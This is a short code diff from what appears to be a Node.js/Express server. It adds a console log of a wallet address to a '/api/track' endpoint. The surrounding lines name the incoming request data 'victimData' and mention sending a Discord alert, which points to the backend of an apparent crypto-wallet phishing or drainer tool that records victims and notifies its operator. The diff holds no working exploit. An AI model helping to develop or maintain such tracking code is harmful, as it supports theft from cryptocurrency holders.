@@ -610,6 +610,7 @@ app.post("/api/track", async (req, res) => {
       });
     }
 
+    console.log("🔍 TRACK ENDPOINT HIT - Wallet:", req.body.walletAddress);
     const victimData = req.body;
 
   // Send Discord alert
